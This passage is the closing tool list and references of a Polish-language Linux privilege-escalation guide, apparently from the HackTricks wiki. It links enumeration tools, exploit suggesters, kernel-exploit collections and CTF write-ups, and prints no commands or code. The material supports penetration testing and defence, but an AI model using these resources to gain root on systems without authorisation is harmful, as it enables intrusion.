- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Dodatkowa pomoc

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Narzędzia do privesc w Linuksie/Unixie

### **Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Linuksie:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opcja -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Wyszukuje podatności jądra w Linuksie i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zbiór innych skryptów**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (eskalacja uprawnień przez interfejs crontab UI, ponowne użycie danych logowania zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: spreparowany payload .text_sig dla monitora uruchamianego przez cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: obejście Neighborhood Watch (przejęcie PATH przez sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Podstawowa eskalacja uprawnień w Linuksie](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Przewodnik po eskalacji uprawnień w Linuksie](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Atak i obrona: techniki eskalacji uprawnień w Linuksie z 2016 roku](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Nikt nie spodziewa się wykonania polecenia!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (eskalacja uprawnień w Linuksie)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – omówienie ćwiczeń laboratoryjnych - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: porady i wskazówki dotyczące eskalacji uprawnień w Linuksie](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: narzędzie do enumeracji i eskalacji uprawnień w Linuksie](https://github.com/rtcrowley/linux-private-i)
- [14] [Czym jest Socket?](https://www.linux.com/news/what-socket/)
- [15] [Omówienie Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Poznaj D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Eskalacja uprawnień w Linuksie przez pliki wykonywalne SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, część 2 – eskalacja uprawnień w Linuksie](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jak zarządzać ACL w Linuksie](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Uzyskanie uprawnień root w Redhat/CentOS przez network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Czym jest systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (wstrzyknięcie arytmetyczne do bash przez logi, pełny łańcuch)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Podręcznik GNU Bash – BASH_ENV (plik startowy dla trybu nieinteraktywnego)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + eskalacja uprawnień przez dowiązanie symboliczne TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (kopiowanie pg_basebackup przez cron → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Nazwij to, a VMware podniesie uprawnienia (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: eskalacja uprawnień przez Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – podatności eskalacji uprawnień w Sudo: CVE-2025-32462 i CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – katalogi repozytorium PYC](https://peps.python.org/pep-3147/)
- [32] [Dokumentacja Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Wpis @paragonsec na Twitterze](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Rejestrowanie haseł w Linuksie](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Szczegóły wyścigu w logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
